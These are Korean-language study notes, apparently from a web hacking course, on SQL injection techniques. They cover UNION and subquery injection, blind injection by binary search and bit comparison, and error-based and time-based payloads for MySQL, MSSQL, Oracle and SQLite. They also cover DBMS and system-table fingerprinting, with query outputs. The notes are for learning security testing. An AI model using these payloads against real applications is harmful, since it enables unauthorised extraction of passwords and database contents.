# Advanced Web Hacking  
보호기법이 적용된 서비스를 분석하고, 우회하여 공격하는 실습  
웹 서비스를 진단하면서 유용하게 사용할 수 있는 도구 소개  

## SQL  
SQL에서는 Data Definition Language(DDL), Data Manipulation Language(DML), Data Control Language(DCL) 총 세 가지 질의 언어 제공  

### Background: Data Manipulation Language(DML). 
데이터베이스에서 데이터를 조회, 추가, 삭제, 수정을 수행하는 구문  
중첩 구문을 쓸 수 있음을 잊지 말자!  
* SELECT  
데이터 조회하는 구문  
* INSERT  
데이터 추가하는 구문  
* UPDATE  
데이터 수정하는 구문  
* DELETE  
데이터 삭제하는 구문  

### Background: SQL Features  
여러 개의 쿼리를 사용하여 데이터를 검색하는 방법, 애플리케이션이 반환하는 결과값을 통해 데이터를 유추하는 방법  
#### **UNION**  
다수의 SELECT 구문의 결과를 결합하는 절  
1. 이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 함  
2. 특정 DBMS에서는 이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입(데이터 타입)이 같아야 함.  
```
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW";
/*
+-----------+--------------+
| username  | password     |
+-----------+--------------+
| admin     | admin        |
| guest     | guest        |
| DreamHack | DreamHack PW |
+-----------+--------------+
3 rows in set (0.01 sec)
*/
```  

#### **Subquery**  
한 쿼리 내에 또 다른 쿼리를 사용하는 것 의미  
쿼리 내에서 괄호 안에 구문 삽입해야함. SELECT 구문만 사용 가능  

공격자는 서브 쿼리를 통해 쿼리가 접근하는 테이블이 아닌 다른 테이블에 접근 가능  
SELECT 구문을 사용하지 않는 쿼리문에서 SQL Injection 취약점이 발생할 때 SELECT 구문을 사용할 수 있음  

1. COLUMNS 절에 서브쿼리  
SELECT 구문의 컬럼 절에서 서브쿼리 사용할 때,  
단일 행(Single Row)과 단일 컬럼(Single Column)이 반환되도록 해야함  
```
mysql> SELECT 1,2,3,(SELECT 456); 
/*
+---+---+---+--------------+
| 1 | 2 | 3 | (SELECT 456) |
+---+---+---+--------------+
| 1 | 2 | 3 |          456 |
+---+---+---+--------------+
1 row in set (0.00 sec)
*/
```  

2. FROM 절에 서브쿼리  
인라인 뷰(Inline View)라고 함  
다중 행(Multiple Row)과 다중 컬럼(Multiple Column) 결과를 반환할 수 있음  
```
mysql> SELECT * FROM (SELECT *, 1234 FROM users) as u;
/*
+----------+------+
| username | 1234 |
+----------+------+
| admin    | 1234 |
| guest    | 1234 |
+----------+------+
2 rows in set (0.00 sec)
*/
```  

3. WHERE 절에 서브쿼리  
다중 행 결과를 반환하는 쿼리문 실행 가능  
```
mysql> SELECT * FROM users WHERE username IN (SELECT "admin" UNION SELECT "guest");
/*
+----------+----------+
| username | password |
+----------+----------+
| admin    | admin    |
| guest    | guest    |
+----------+----------+
2 rows in set (0.00 sec)
*/
```  

#### **Application Logic**  
SQL Injection은 애플리케이션 내부에서 사용하는 데이터베이스의 데이터를 조작하는 기법  
쿼리의 실행 결과가 애플리케이션에서 보여지지 않는다면 공격자는 데이터베이스의 정보를 추측하기 어려움  
그러나 데이터 베이스 결과에 따라 어플리케이션은 각기 다른 기능을 수행하므로  
-> 공격자는 참과 거짓을 구분하여 공격을 수행할 수 있음.  

* SQL에서는 IF 문을 사용해 비교 구문 만들 수 있음  
해당 구문을 통해 관리자의 계정의 비밀번호를 한 글자씩 알아낼 수 있음.  
```substr``` 함수 이용  
> ```UNION SELECT IF(substr(password,1,1) ='B', 'admin', 'not admin') from users where username='admin' -- ```  
> if ( 조건문, 참일때 값, 거짓일때 값); 문제에서 admin이 select 되면 true 리턴하게 때문에 참일 때 값을 어쨌든 admin을 준 것  

## ExploitTech: Blind SQL Injection Advanced  
* 해당 공격 기법은 임의 데이터를 알아내기 위한 일련의 방법으로 수많은 쿼리 전송이 요구됨  
* 방화벽에 의해 접속 IP가 차단될 수 있음  
* 알아내려는 데이터의 길이가 길면 길수록 실행해야하는 쿼리 늘어남, 공격에 들이는 시간 길어짐  

내용을 효율적으로 알아내는 방법. 즉, 시간 복잡도를 낮추는 방법  

### Binary Serach  
이미 정렬된 리스트에서 임의의 값을 효율적으로 찾기 위한 알고리즘  
1. 범위 지정  
범위의 중간값 지정  
2. 범위 조절  
중간 값보다 큰지 작은지에 따라 해당 중간값으로 범위가 조절됨. 이 과정 반복  

* 아스키에서 출력 가능한 문자의 범위는 32~126  
ex) 패스워드 첫번째 바이트가 79보다 큰값인지 확인  
```select * from users where username='admin' and ascii(substr(password, 1, 1))>79;```. 

### Bit 연산  
ASCII는 0부터 127범위의 문자 표현, 즉 7개의 비트를 통해 하나의 문자를 나타낼 수 있음  
하나의 비트는 0과 1로 이루어져 있으니 7개의 비트에 대해 0,1인지 비교하면 총 7번의 쿼리로 임의 데이터의 한 바이트를 알아낼 수 있음~~(꼭 이래야만해?)~~  
MySQL에서 숫자를 비트 형태로 변환하는 **bin**함수 제공함  
```
mysql> SELECT bin(ord('A'));
+---------------+
| bin(ord('A')) |
+---------------+
| 1000001       |
+---------------+
1 row in set (0.00 sec)
```  

* 비트 연산을 통한 Blind SQL Injection 예시  
```select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;```  

## ExploitTech: Error & Time based SQL Injection  
쿼리 결과를 애플리케이션 기능에서 출력하지 않는 경우 사용  
취약점 발생 형태는 같으나 공격 성공 여부를 어떻게 판단하느냐에 따라 명칭 구분  

### Error based SQl Injection  
임의로 에러를 발생시켜 데이터베이스 및 운영체제의 정보를 획득하는 공격 기법  
Flask: Debug 모드 활성화 -> 오류가 발생할 때 발생 원인 출력. 공격자는 오류 메세지를 통해 공격에 필요한 다양한 정보 수집, 원하는 데이터 획득  
에러메세지(예외 처리)와 같이 쿼리 실행 결과를 직접 노출하지는 않지만 중요한 정보를 노출하는 방법들이 존재  

애플리케이션에서 발생하는 에러를 이용해 공격하려 한다면 문법에러와 같이 DBMS에서 쿼리가 실행되기 전에 발생하는 에러가 아닌  
런타임(Runtime) 즉, 쿼리가 실행되고 나서 발생하는 에러가 필요  

#### extractvalue 함수(mysql)  
첫번째 인자로 전달된 XML 데이터에서 두번째 인자인 XPATH 식을 통해 데이터 추출  
해당 함수를 응용해 사용할 경우 데이터베이스의 정보 추출할 수 있음  
해당 쿼리 에러 메세지에 운영체제에 대한 정보가 포함되어 있음. 공격자는 해당 정보를 통해 1-day 또는 0-day 공격 통해 서버 장악 가능.  

```
mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)
```  
* a 다음에 단어인 test가 출력  

```
mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
```  

DBMS 별 Error based SQLI 통해 공격하는 방법  
* MySQL  
```
SELECT updatexml(null,concat(0x0a,version()),null);
/*
ERROR 1105 (HY000): XPATH syntax error: '
5.7.29-0ubuntu0.16.04.1-log'
*/
```  

```
SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/
```  

```
SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
/*
ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
*/
```  

* MSSQL  
```
SELECT convert(int,@@version);
SELECT cast((SELECT @@version) as int);
/*
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/
```  

* Oracle  
```
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/
```  

### Error based Blind SQl Injection  
Blind SQLI + Error based SQLI  
임의로 에러 발생시키고 참/거짓 판단해 데이터 추출  

Error based SQLI: 에러 메세지를 통해 출력된 데이터로 정보 수집해 출력값에 영향  
Error based Blind SQLI: 에러 발행 여부만을 필요  

ex) MySQL Double 자료형 최댓값을 초과해 에러 발생 시킴. 서버가 반환하는 HTTP 상태 코드, 애플리케이션의 응답 차이를 통해 에러 발생 여부 확인, 참/거짓 여부 판단  

### Short-circuit evaluation  
로직 연산의 원리를 이용해 공격하는 방법  
ex) A AND B -> 두 식의 결과가 모두 참이 반환돼야 전체 식이 참이 됨. 하나라도 거짓을 반환하면 B 연산을 실행하지 않는다는 점을 이용해 공격  

* AND 연산자 이용한 공격 방법  
```
mysql> SELECT 0 AND SLEEP(1);
+----------------+
| 0 AND SLEEP(1) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1 AND SLEEP(10);
+-----------------+
| 1 AND SLEEP(10) |
+-----------------+
|               0 |
+-----------------+
1 row in set (10.04 sec)
```  
처음 식이 거짓인 경우 SLEEP 실행 안되고 처음 식이 참이면 SLEEP 실행됨  

* OR 연산자 이용한 공격 방법  
```
mysql> SELECT 1=1 or 9e307*2;
+----------------+
| 1=1 or 9e307*2 |
+----------------+
|              1 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1=0 or 9e307*2;
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
```  
처음 식이 참이면 뒤따라오는 식의 결과에 영향을 받지 않는다는 점 이용해 공격  

### Time based SQl Injection  
시간 지연을 이용해 쿼리의 참/거짓 여부 판단  
시간 지연 시키는 방법: DBMS에서 제공되는 함수 또는 시간이 많이 소요되는 연산을 수행하는 heavy query를 사용하는 방법  

* MySQL  
```
/* SLEEP(duration) */
mysql> SELECT SLEEP(1);
+----------+
| SLEEP(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
```  
sleep 함수  

```
/* BENCHMARK(count, expr) */
mysql> SELECT BENCHMARK(40000000,SHA1(1));
+-----------------------------+
| BENCHMARK(40000000,SHA1(1)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (10.78 sec)
```  
benchmark 함수

```
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.41 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
+-------+
| heavy |
+-------+
| 85264 |
+-------+
1 row in set (0.01 sec)
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.38 sec)
```  
heavy query  

* MSSQL  
```
/* waitfor delay 'time_to_pass'; */
> SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec
```  
waitfor  

```
select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
/*
Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
*/
```  
heavy query

* SQLite  
```
/* LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) */
sqlite> .timer ON
sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
0
Run Time: real 9.740 user 7.983349 sys 1.743972
```  
heavy query  

## ExploitTech: System Table Fingerprinting  

모의 해킹은 Penetration Testing Execution Standard(PTES)에 의하면 총 7 단계로 구성  
처음 과정을 보면, 먼저 공격 대상을 지정하고 대상의 정보를 수집. 이 때 대상의 정보를 수집하는 과정을 핑거프린팅(Fingerprinting)이라고 함  
정보 수집은 모의해킹에 있어 가장 중요한 단계. 공격 대상이 사용하는 웹서버, 개발 언어, DBMS, 내부 정보 등을 알아내는 과정이 이에 해당됨  

### System Tables  
DBMS마다 데이터베이스의 정보를 포괄하는 시스템 테이블이 존재  
시스템 테이블: 설정 및 계정 정보, 테이블과 컬럼 정보, 현재 실행되고 있는 쿼리의 정보 등 포함  

SQL Injection에 앞서 원하는 정보다 포함된 테이블과 컬럼명을 알아내야함. 시스템 테이블을 조회하는 쿼리를 작성하여 해당 정보를 알아냄  
데이터베이스를 구성하기 위한 필수 요소이기 때문에 삭제할 수 없음!!  
따라서 SQL Injection 취약점을 발견하면 이 DBMS별 시스템 테이블을 이용할 수 있음.  

### MySQL  
* 초기 데이터 베이스 모습  
```
mysql> show databases;
/*
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
*/
```  

* 스키마 정보 조회  
```
mysql> select TABLE_SCHEMA from information_schema.tables group by TABLE_SCHEMA;
/*
+--------------------+
| TABLE_SCHEMA       |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)
*/
```  

* 테이블 정보 조회  
```
mysql> select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
/*
+--------------------+----------------+
| TABLE_SCHEMA       | TABLE_NAME     |
+--------------------+----------------+
| information_schema | CHARACTER_SETS |
...
| mysql              | db             |
...
+--------------------+----------------+
292 rows in set (0.01 sec)
*/
```  

* 컬럼 정보 조회  
```
mysql> select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS;
/*
+--------------------+----------------+--------------------+
| TABLE_SCHEMA       | TABLE_NAME     | COLUMN_NAME        |
+--------------------+----------------+--------------------+
| information_schema | CHARACTER_SETS | CHARACTER_SET_NAME |
...
| DREAMHACK          | users          | uid                | * 예시(시스템 테이블은 아님)
| DREAMHACK          | users          | upw                | * 예시(시스템 테이블은 아님)
...
| mysql              | db             | Db                 |
| mysql              | db             | User               |
...
+--------------------+----------------+--------------------+
3132 rows in set (0.07 sec)
*/
```  

* 실시간 실행 쿼리 정보  
```
mysql> select * from information_schema.PROCESSLIST;
/*
+-------------------------------------------------+
| info                                            |
+-------------------------------------------------+
| select info from information_schema.PROCESSLIST |
+-------------------------------------------------+
1 row in set (0.00 sec)
*/
```  

* 계정 및 실시간 실행 쿼리 조회  
```
mysql> select user,current_statement from sys.session;
/*
+----------------+------------------------------------------------+
| user           | current_statement                              |
+----------------+------------------------------------------------+
| root@localhost | select user,current_statement from sys.session |
+----------------+------------------------------------------------+
1 row in set (0.05 sec)
*/
```  

* DBMS 권한 및 계정 정보    
```
mysql> select GRANTEE,PRIVILEGE_TYPE,IS_GRANTABLE from information_schema.USER_PRIVILEGES;
/*
+-------------------------+-------------------------+--------------+
| GRANTEE                 | PRIVILEGE_TYPE          | IS_GRANTABLE |
+-------------------------+-------------------------+--------------+
| 'root'@'localhost'      | SELECT                  | YES          |
...
| 'root'@'localhost'      | SUPER                   | YES          |
...
| 'user_test'@'localhost' | USAGE                   | NO           |
+-------------------------+-------------------------+--------------+
58 rows in set (0.00 sec)
*/
```  

* DBMS 계정 정보  
```
mysql> select User, authentication_string from mysql.user;
/*
+------------------+-------------------------------------------+
| User             | authentication_string                     |
+------------------+-------------------------------------------+
| root             | *...                                      |
| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| user_test        | *...                                      |
+------------------+-------------------------------------------+
4 rows in set (0.00 sec)
*/
```  

### 그외  
[MSSQL](https://learn.dreamhack.io/306#9)  
[PostgreSQL](https://learn.dreamhack.io/306#13)  
[Oracle](https://learn.dreamhack.io/306#17)  
[SQLite](https://learn.dreamhack.io/306#19)  

## ExploitTech: DBMS Fingerprinting  
> 범죄 현장에 있어서 증거를 수집하고 분석하는 것은 수사의 핵심.  
> 범죄 현장에서 발견할 수 있는 증거 중 하나인 지문은 사람이 가지고 있는 고유한 정보로 수사를 해결하기 위한 열쇠.  
> 지문은 영단어로 핑거프린트 (Fingerprint)이며 해당 단어는 모의 해킹에서도 등장.  

모의 해킹은 **Penetration Testing Execution Standard (PTES)** 에 의하면 총 일곱 가지 단계 -> 체계화된 방법으로 모의 해킹을 수행 가능.  
먼저 공격 대상을 지정하고 대상의 정보를 수집합니다. 이때, 대상의 정보를 수집하는 과정을 **핑거프린팅 (Fingerprinting)** 이라고 함.  
정보 수집은 모의 해킹에 있어 가장 중요한 단계 중 하나.  

공격 대상이 사용하는 웹 서버와 개발 언어, 그리고 DBMS 등을 알아내는 과정 포함.  
소프트웨어 마다 서로 다른 기능과 특징이 있기 때문에 이러한 정보를 수집한다면 공격 지점을 쉽게 도출해낼 수 있을 뿐만 아니라 알려진 취약점을 사용할 수 있음  

DBMS는 용도와 목적에 따라 MySQL, MSSQL, Oracle, SQLite 등 -> 비슷한 쿼리 형태, 각 시스템 별로 제공하는 함수가 다름  
SQL Injection 취약점 발견하면 -> DBMS의 종류와 버전을 제일 먼저 알아내야함  

### 쿼리 실행 결과 출력  
애플리케이션에서 삽입한 쿼리의 실행 결과 출력하는 경우  
-> DBMS에서 지원하는 환경 변수의 값 이용  

```
SELECT @@version  
SELECT version()
```  

### 에러 메세지 출력  
삽입한 쿼리를 애플리케이션에서 실행하면서 에러 메세지 출력하는 경우  

```
// 잘못된 쿼리를 삽입했을 때 에러 메세지가 출력

select 1 union select 1, 2;
# MySQL => ERROR 1222 (21000): The used SELECT statements have a different number of columns
(select * from not_exists_table)
# SQLite => Error: no such table: not_exists_table

```  

### 참 또는 거짓 출력  
애플리케이션에서 쿼리 실행 결과가 아닌 참과 거짓 여부만을 출력할 경우  
-> Blind SQL Injection 공격으로 사용중인 DBMS 알아내기  

```
// 버전 환경 변수 및 함수를 통해 가져온 버전을 한 바이트씩 비교해서 알아내기

mid(@@version, 1, 1)='5';
substr(version(), 1, 1)='P';
```  

### 예외 상황  
애플리케이션에서 쿼리와 관련된 어떠한 결과도 출력하지 않는 경우  
-> 시간 지연 함수 사용  

```
sleep(10)
pg_sleep(10)
```  

[MySQL](https://learn.dreamhack.io/305#5)  
[PostgreSQL](https://learn.dreamhack.io/305#6)  
[MSSQL](https://learn.dreamhack.io/305#7)  
[SQLite](https://learn.dreamhack.io/305#8)  

### 방어법  
정기적으로 DBMS 및 운영 체제 업데이트  
